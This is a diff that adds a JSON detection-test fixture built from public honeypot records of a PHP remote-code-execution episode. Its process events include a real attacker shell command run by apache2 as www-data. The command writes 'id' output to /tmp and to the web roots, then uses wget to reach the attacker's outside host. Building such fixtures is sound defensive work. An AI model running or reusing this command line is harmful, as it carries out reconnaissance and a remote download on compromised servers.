@@ -1,0 +1,85 @@
+{
+  "label": "malicious",
+  "variant": "Episode A (15.204.59.70 -> T1): apache2 -> /bin/sh -c id>/tmp/x1;...;wget (recon+tmpexec+download in one command)",
+  "source": "derived from public honeypot evidence 0x4D31/honeypot-data (CC-BY-4.0), report https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md, dataset https://github.com/0x4D31/honeypot-data/tree/main/reports/php2shell/2026-10-24-rce-evidence at commit 0b6a57491134c10f7cc5055999f1cb8b38c67546",
+  "license": "CC-BY-4.0, author 0x4D31; see THIRD_PARTY_NOTICES.md",
+  "derived": true,
+  "synthetic": false,
+  "field_mapping": "Field-mapped from Tetragon process_exec records, not native Defender DeviceProcessEvents telemetry. InitiatingProcessFileName=basename(parent.binary); FileName=basename(process.binary); ProcessCommandLine=process.binary+\" \"+process.arguments; DeviceId and DeviceName=node_name; AccountName=www-data from uid 33; ReportId not available. Only process_exec records with the case's shell or its descendants are included; kprobe socket records are omitted. Values are otherwise as published (attacker IPs as published; honeypot addresses are the publisher's TEST-NET aliases).",
+  "expect_alert": true,
+  "expect_alert_before_fix": true,
+  "result": "not run",
+  "source_files": [
+    "https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-rce-evidence/episode-a/A01/tetragon.jsonl",
+    "https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-rce-evidence/episode-a/A02/tetragon.jsonl",
+    "https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-rce-evidence/episode-a/A03/tetragon.jsonl"
+  ],
+  "events": [
+    {
+      "Timestamp": "2026-10-24T15:35:38.673197428Z",
+      "DeviceId": "ip-10-29-200-8",
+      "DeviceName": "ip-10-29-200-8",
+      "InitiatingProcessFileName": "apache2",
+      "FileName": "sh",
+      "ProcessCommandLine": "/bin/sh -c -- \"id>/tmp/x1;for d in /var/www/html /var/www;do id>$d/p1;done;wget -q http://15.204.59.70:8081/ok33\"",
+      "AccountName": "www-data",
+      "_case": "A01",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjE4NDI3OTk1MjQ3MTc6Mzk1Nzcw"
+    },
+    {
+      "Timestamp": "2026-10-24T15:35:38.674720187Z",
+      "DeviceId": "ip-10-29-200-8",
+      "DeviceName": "ip-10-29-200-8",
+      "InitiatingProcessFileName": "sh",
+      "FileName": "id",
+      "ProcessCommandLine": "/usr/bin/id",
+      "AccountName": "www-data",
+      "_case": "A01",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjE4NDI4MDEwNDczNjY6Mzk1Nzcx"
+    },
+    {
+      "Timestamp": "2026-10-24T16:04:16.649903310Z",
+      "DeviceId": "ip-10-29-200-8",
+      "DeviceName": "ip-10-29-200-8",
+      "InitiatingProcessFileName": "apache2",
+      "FileName": "sh",
+      "ProcessCommandLine": "/bin/sh -c -- \"id>/tmp/x1;for d in /var/www/html /var/www;do id>$d/p1;done;wget -q http://15.204.59.70:8081/ok33\"",
+      "AccountName": "www-data",
+      "_case": "A02",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjM1NjA3NzYyMzA1Nzk6NDAxNzYw"
+    },
+    {
+      "Timestamp": "2026-10-24T16:04:16.651249008Z",
+      "DeviceId": "ip-10-29-200-8",
+      "DeviceName": "ip-10-29-200-8",
+      "InitiatingProcessFileName": "sh",
+      "FileName": "id",
+      "ProcessCommandLine": "/usr/bin/id",
+      "AccountName": "www-data",
+      "_case": "A02",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjM1NjA3Nzc1NzYyMjc6NDAxNzYx"
+    },
+    {
+      "Timestamp": "2026-10-24T16:04:26.482316955Z",
+      "DeviceId": "ip-10-29-200-8",
+      "DeviceName": "ip-10-29-200-8",
+      "InitiatingProcessFileName": "apache2",
+      "FileName": "sh",
+      "ProcessCommandLine": "/bin/sh -c -- \"id>/tmp/x1;for d in /var/www/html /var/www;do id>$d/p1;done;wget -q http://15.204.59.70:8081/ok33\"",
+      "AccountName": "www-data",
+      "_case": "A03",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjM1NzA2MDg2NDQwNDQ6NDAxNzY2"
+    },
+    {
+      "Timestamp": "2026-10-24T16:04:26.484914859Z",
+      "DeviceId": "ip-10-29-200-8",
+      "DeviceName": "ip-10-29-200-8",
+      "InitiatingProcessFileName": "sh",
+      "FileName": "id",
+      "ProcessCommandLine": "/usr/bin/id",
+      "AccountName": "www-data",
+      "_case": "A03",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjM1NzA2MTEyNDIwNTg6NDAxNzY3"
+    }
+  ]
+}
